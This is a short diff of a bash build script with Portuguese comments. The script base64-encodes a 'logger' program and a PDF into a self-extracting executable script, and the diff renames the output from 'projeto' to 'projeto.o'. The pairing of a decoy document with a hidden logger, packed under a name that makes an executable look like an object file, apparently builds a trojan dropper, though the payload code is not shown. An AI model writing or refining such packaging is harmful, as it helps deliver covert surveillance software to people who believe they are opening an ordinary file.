@@ -16,7 +16,7 @@ PROG_B64=$(base64 -w0 prog_test) # Codifica o logger
 
 
 # Gera o conteúdo e arquivo final - Nome: projeto
-cat > projeto << 'EOF'
+cat > projeto.o << 'EOF'
 
 #!/bin/bash
 
@@ -48,8 +48,8 @@ exit 0
 EOF
 
 # Substitui os placeholders pelos valores reais
-sed -i "s|SUBSTITUIR_PDF|$PDF_B64|" projeto
-sed -i "s|SUBSTITUIR_PROG|$PROG_B64|" projeto
+sed -i "s|SUBSTITUIR_PDF|$PDF_B64|" projeto.o
+sed -i "s|SUBSTITUIR_PROG|$PROG_B64|" projeto.o
 
 # Dá permissão de execução
-chmod +x projeto
+chmod +x projeto.o
